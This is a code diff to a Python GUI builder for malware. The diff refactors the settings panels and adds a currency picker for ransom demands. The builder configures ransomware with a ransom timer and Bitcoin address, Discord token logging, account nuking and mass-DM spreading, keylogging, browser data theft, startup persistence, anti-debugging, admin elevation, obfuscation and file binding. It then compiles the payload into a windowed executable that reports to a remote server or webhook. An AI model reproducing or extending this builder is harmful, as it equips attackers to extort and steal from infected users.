@@ -3,9 +3,10 @@ from tqdm import tqdm
 from tkinter import *
 from PIL import Image
 from tkinter import filedialog as fd
+from bit import SUPPORTED_CURRENCIES
 from colorama import Style, Fore, Back
 from websocket import create_connection
-import customtkinter, subprocess, websocket, threading, requests, tkinter, shutil, random, base64, json, fade, time, math, sys, ssl, os
+import customtkinter, subprocess, websocket, threading, coincurve, requests, tkinter, shutil, random, base64, json, fade, time, math, sys, ssl, os
 
 customtkinter.set_appearance_mode("dark")
 
@@ -71,11 +72,9 @@ class Frame(customtkinter.CTkFrame):
 
         
 
-        for count, (title, data) in enumerate(widgets.items()):
+        for count, (title, widget_type) in enumerate(widgets.items()):
             x = (count // 1) + 1
             y = (count % 1) * 1
-
-            widget_type = data[0]
 
             if widget_type is customtkinter.CTkEntry:
                 var = tkinter.IntVar(value=0)
@@ -93,6 +92,18 @@ class Frame(customtkinter.CTkFrame):
                 if activation_widget == count:
                     activate_widget = widget
                     widget.configure(command=lambda: self.on_click(widgets, default, activate_widget.get()))
+
+            elif widget_type is customtkinter.CTkOptionMenu:
+                options = [*dict(SUPPORTED_CURRENCIES).values()]
+
+                var = customtkinter.StringVar(value="United States Dollar")
+
+                widget = widget_type(master=self, values=options, variable=var)
+                widget.grid(row=x, column=2, sticky="ew")
+
+                widgets[title] = widget
+
+                continue
 
             else:
                 self.icon = tkinter.StringVar(value="")
@@ -215,51 +226,51 @@ class App(customtkinter.CTk):
         binder_frame.columnconfigure(0, weight=1)
 
         ransomware_widgets = {
-            "Ransomware": [customtkinter.CTkCheckBox],
-            "Reboots Until Run": [customtkinter.CTkEntry],
-            "Ransom Time Limit (Hours)": [customtkinter.CTkEntry],
-            "Crypto Address": [customtkinter.CTkEntry],
-            "Ransom Amount": [customtkinter.CTkEntry],
-            "Crypto Currency": [customtkinter.CTkEntry]
+            "Ransomware": customtkinter.CTkCheckBox,
+            "Reboots Until Run": customtkinter.CTkEntry,
+            "Ransom Time Limit (Hours)": customtkinter.CTkEntry,
+            "Bitcoin Address": customtkinter.CTkEntry,
+            "Ransom Amount": customtkinter.CTkEntry,
+            "Currency": customtkinter.CTkOptionMenu
         }
         
         ransom_frame = Frame(master=main_frame, widgets=ransomware_widgets, row=0, column=11, columnspan=3, rowspan=10, pady=0, padx=20, intonly=[1, 2, 4])
 
         discord_widgets = {
-            "Token Logger": [customtkinter.CTkCheckBox],
-            "Auto Nuke": [customtkinter.CTkCheckBox],
-            "MassDM": [customtkinter.CTkCheckBox],
-            "MassDM Script": [customtkinter.CTkEntry]
+            "Token Logger": customtkinter.CTkCheckBox,
+            "Auto Nuke": customtkinter.CTkCheckBox,
+            "MassDM": customtkinter.CTkCheckBox,
+            "MassDM Script": customtkinter.CTkEntry
         }
         
         discord_frame = Frame(master=main_frame, widgets=discord_widgets, row=0, column=8, columnspan=3, rowspan=10, pady=0, padx=20)
 
         connection_widgets = {
-            "Connect To Server": [customtkinter.CTkCheckBox],
-            "Dynamic Webhook": [customtkinter.CTkCheckBox],
-            "Server Address": [customtkinter.CTkEntry],
-            "Server Password": [customtkinter.CTkEntry],
-            "Webhook": [customtkinter.CTkEntry]
+            "Connect To Server": customtkinter.CTkCheckBox,
+            "Dynamic Webhook": customtkinter.CTkCheckBox,
+            "Server Address": customtkinter.CTkEntry,
+            "Server Password": customtkinter.CTkEntry,
+            "Webhook": customtkinter.CTkEntry
             
         }
         
         connection_frame = Frame(master=main_frame, default=[4], widgets=connection_widgets, row=0, column=5, columnspan=3, rowspan=10, pady=0, padx=20)
 
         misc_widgets = {
-            "Key Logger": [customtkinter.CTkCheckBox],
-            "Browser Logs": [customtkinter.CTkCheckBox],
-            "Add To Startup": [customtkinter.CTkCheckBox],
-            "File Icon": [customtkinter.CTkButton],
-            "Anti Debug": [customtkinter.CTkCheckBox],
-            "Run As Admin": [customtkinter.CTkCheckBox],
-            "Base (2 - 55000)": [customtkinter.CTkEntry],
-            "Obfuscation (1 - 5)": [customtkinter.CTkEntry]
+            "Key Logger": customtkinter.CTkCheckBox,
+            "Browser Logs": customtkinter.CTkCheckBox,
+            "Add To Startup": customtkinter.CTkCheckBox,
+            "File Icon": customtkinter.CTkButton,
+            "Anti Debug": customtkinter.CTkCheckBox,
+            "Run As Admin": customtkinter.CTkCheckBox,
+            "Base (2 - 55000)": customtkinter.CTkEntry,
+            "Obfuscation (1 - 5)": customtkinter.CTkEntry
         }
         
         misc_frame = Frame(master=main_frame, widgets=misc_widgets, intonly=[6, 7], default=[6, 7], row=0, column=1, columnspan=3, rowspan=16, pady=0, padx=20, activation_widget=None)
 
         binder_widgets = {
-            "Add File": [customtkinter.CTkButton]
+            "Add File": customtkinter.CTkButton
         }
 
         binder_frame = ScrollableFrame(master=binder_frame, widgets=binder_widgets, row=0, column=0, columnspan=1, rowspan=1, pady=0, padx=0)
@@ -280,7 +291,7 @@ class App(customtkinter.CTk):
         wallet = ''
         massdm_script = ''
         cost = 0
-        crypto_type = ''
+        currency = ''
         reboots_allowed = 0
         hours = 0
         webhook = ''
@@ -294,9 +305,11 @@ class App(customtkinter.CTk):
         if ransomware:
             reboots_allowed = ransomware_config['Reboots Until Run'].get()
             hours = ransomware_config['Ransom Time Limit (Hours)'].get()
-            wallet = ransomware_config['Crypto Address'].get()
+            wallet = ransomware_config['Bitcoin Address'].get()
             cost = ransomware_config['Ransom Amount'].get()
-            crypto_type = ransomware_config['Crypto Currency'].get()
+            currency = ransomware_config['Currency'].get()
+
+            currency = list(SUPPORTED_CURRENCIES)[list(SUPPORTED_CURRENCIES.values()).index(currency)]
 
         token_logger = discord_config['Token Logger'].get()
         if discord_config:
@@ -326,7 +339,7 @@ class App(customtkinter.CTk):
 
         self.response_label.configure(text='Compiling To Exe...')
 
-        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
+        self.compile([rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files])
 
     def banner(self):
         print(fade.greenblue("""
@@ -341,7 +354,7 @@ class App(customtkinter.CTk):
         """))
 
     def compile(self, config):
-        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, crypto_type, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
+        rat_client, server_addr, server_key, dynamic_webhook, webhook, ransomware, reboots_allowed, hours, wallet, cost, currency, keylogger, token_logger, massdm, massdm_script, auto_nuke, browser, startup, debug, icon, admin, binder_files = config
         key = {
             "SERVER_CLIENT": rat_client,
             "HOSTNAME": f'O0O000OOO00O0OOO0("{server_addr}").decode()',
@@ -350,9 +363,9 @@ class App(customtkinter.CTk):
             "RANSOMWARE": ransomware,
             "REBOOTS_ALLOWED": reboots_allowed,
             "HOURS": hours,
-            "MONERO_WALLET": wallet,
+            "CRYPTO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
-            "CRYPTO_TYPE": crypto_type,
+            "CURRENCY": currency,
             "WEBHOOK": f'"{webhook}"' if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
@@ -385,7 +398,7 @@ class App(customtkinter.CTk):
             data = file.read()
 
         with open('src\\temp\\instructions.txt', 'w+') as file:
-            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CRYPTO', crypto_type))
+            file.write(data.replace('WALLET', wallet).replace('AMOUNT', str(cost)).replace('CURRENCY', currency))
         
         binder_args = []
 
@@ -394,7 +407,8 @@ class App(customtkinter.CTk):
             shutil.copyfile(path, f'src\\temp\\binder_{filename}')
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
-        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--windowed', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.'] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
